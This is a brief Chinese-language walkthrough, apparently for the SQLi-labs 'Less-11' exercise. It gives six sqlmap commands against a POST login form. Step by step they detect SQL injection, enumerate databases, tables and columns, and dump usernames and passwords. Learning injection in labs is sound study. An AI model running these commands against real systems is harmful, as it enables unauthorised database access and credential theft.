# less11

## 测试存在SQL注入

```
sqlmap.py -u "http://193.168.4.44/Less-11/" --method=POST --data="uname=ss&passwd=dd&submit=Submit" --batch --flush-session
```



## 获取所有数据库

```
sqlmap.py -u "http://193.168.4.44/Less-11/" --method=POST --data="uname=ss&passwd=dd&submit=Submit" --dbs --batch --flush-session
```



## 获取当前的数据库

```
sqlmap.py -u "http://193.168.4.44/Less-11/" --method=POST --data="uname=ss&passwd=dd&submit=Submit" --current-db --batch --flush-session
```



## 获取security的表

```
sqlmap.py -u "http://193.168.4.44/Less-11/" --method=POST --data="uname=ss&passwd=dd&submit=Submit" -D security --tables --batch --flush-session
```



## 获取users表中所有的列

```
sqlmap.py -u "http://193.168.4.44/Less-11/" --method=POST --data="uname=ss&passwd=dd&submit=Submit" -D security -T users --columns --batch --flush-session
```



## 获取数据

```
sqlmap.py -u "http://193.168.4.44/Less-11/" --method=POST --data="uname=ss&passwd=dd&submit=Submit" -D security -T users -C "id,username,password" --dump --batch --flush-session
```

